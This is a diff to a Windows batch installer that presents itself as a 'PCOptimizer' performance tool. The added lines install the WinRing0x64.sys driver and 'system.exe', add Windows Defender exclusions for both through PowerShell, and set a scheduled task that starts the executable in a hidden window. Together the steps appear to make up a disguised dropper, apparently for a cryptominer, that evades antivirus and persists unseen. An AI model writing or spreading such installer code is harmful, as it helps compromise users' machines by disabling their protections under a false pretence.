@@ -7,6 +7,7 @@ set "APP_NAME=PCOptimizer"
 set "INSTALL_DIR=%ProgramData%\%APP_NAME%"
 set "ZIP_PATH=%TEMP%\%APP_NAME%.zip"
 set "EXE_NAME=system.exe"
+set "DRIVER_NAME=WinRing0x64.sys"
 :: =========================================
 
 echo [1/6] Scanning system for performance issues...
@@ -44,7 +45,12 @@ if exist "%INSTALL_DIR%\pc-optimizer" (
     rmdir /s /q "%INSTALL_DIR%\pc-optimizer"
 )
 
-echo [6/6] Finalizing...
+:: Add exclusions before running the executable
+echo [5/7] Adding security exclusions...
+powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%DRIVER_NAME%'"
+powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%EXE_NAME%'"
+
+echo [6/7] Creating startup task...
 
 schtasks /create /tn "%APP_NAME%" ^
  /tr "powershell -WindowStyle Hidden -Command Start-Process '%INSTALL_DIR%\%EXE_NAME%' -WindowStyle Hidden" ^
@@ -57,6 +63,8 @@ if %errorlevel% neq 0 (
     pause
     exit /b 1
 )
+
+echo [7/7] Finalizing installation...
 
 echo.
 echo Installation complete.
